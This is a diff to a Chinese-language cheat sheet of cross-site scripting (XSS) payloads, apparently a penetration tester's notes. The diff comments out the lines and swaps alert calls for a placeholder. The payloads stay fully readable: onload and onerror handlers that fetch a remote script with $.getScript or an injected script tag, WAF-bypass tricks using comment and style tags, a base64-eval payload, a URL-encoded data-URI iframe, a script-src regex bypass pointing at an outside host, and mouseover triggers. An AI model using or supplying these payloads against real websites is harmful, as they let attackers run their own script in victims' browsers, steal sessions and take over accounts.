@@ -18,7 +18,7 @@
 ### 常用
 
 ```
-<BODY/ONLOAD=$.getScript("js地址")>
+// <BODY/ONLOAD=$.getScript("js地址")>
 ```
 
 
@@ -35,28 +35,29 @@ https://www.cnblogs.com/wjrblogs/p/12341190.html
 ### 图片加载错误执行js代码（不显示图片）
 
 ```
-<img/src=# style=display:none onerror=$.getScript("js地址")>
+// <img/src=# style=display:none onerror=$.getScript("js地址")>
+// <img/src=# style=display:none onerror=createElement('script');body.appendChild(s);s.src='js地址'>
 ```
 
-bypass 常规waf
+bypass 常规waf(x=alert(1))
 
 ```
 冷门标签绕过：
 
-`!-- --`绕过:
-`<!--<img src="--><img src onerror=alert(1)//">`
+// `!-- --`绕过:
+// `<!--<img src="--><img src onerror=x//">`
 
-`<style><img src="</style><img src onerror=alert(1)//">`
+// `<style><img src="</style><img src onerror=x//">`
 ```
 
 
 
 
-### 短，无script标签
+### 短，无script标签(x=alert('123'))
 
 ```
-<BODY/ONLOAD=alert('123')>   
-<SVG/ONLOAD=alert('123')>
+// <BODY/ONLOAD=x>   
+// <SVG/ONLOAD=x>
 ```
 
 
@@ -64,7 +65,7 @@ bypass 常规waf
 ### base64
 
 ```
-<img style=display:none src=# onerror=eval(atob('YWxlcnQoJzEyMycp'))>
+// <img style=display:none src=# onerror=eval(atob('YWxlcnQoJzEyMycp'))>
 YWxlcnQoJzEyMycp => alert('123')
 ```
 
@@ -73,7 +74,7 @@ YWxlcnQoJzEyMycp => alert('123')
 ### data:text/html  # 目前只能测试能在iframe上使用
 
 ```
-<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+// <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 %3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E -> <script>alert(1)</script>
 ```
 
@@ -82,7 +83,7 @@ YWxlcnQoJzEyMycp => alert('123')
 ### 绕过<script src>的正则
 
 ```
-<SCRIPT a=">" SRC="//xxx.com/xxxx"></SCRIPT>   
+// <SCRIPT a=">" SRC="//xxx.com/xxxx"></SCRIPT>   
 ```
 
 
@@ -90,7 +91,7 @@ YWxlcnQoJzEyMycp => alert('123')
 ### 当fuzz出可以执行js代码的标签后，执行在当前页面添加script标签语句
 
 ```
-<img src=# onerror=s=createElement('script');body.appendChild(s);s.src='js地址';>
+// <img src=# onerror=s=createElement('script');body.appendChild(s);s.src='js地址';>
 ```
 
 
@@ -98,7 +99,7 @@ YWxlcnQoJzEyMycp => alert('123')
 ### 可用（不看伪装效果，动静较大）
 
 ```
-<IFRAME SRC=# onmouseover=$.getScript("js地址")></IFRAME>  
-<input/onmouseover=$.getScript("js地址")>
+// <IFRAME SRC=# onmouseover=$.getScript("js地址")></IFRAME>  
+// <input/onmouseover=$.getScript("js地址")>
 ```
 
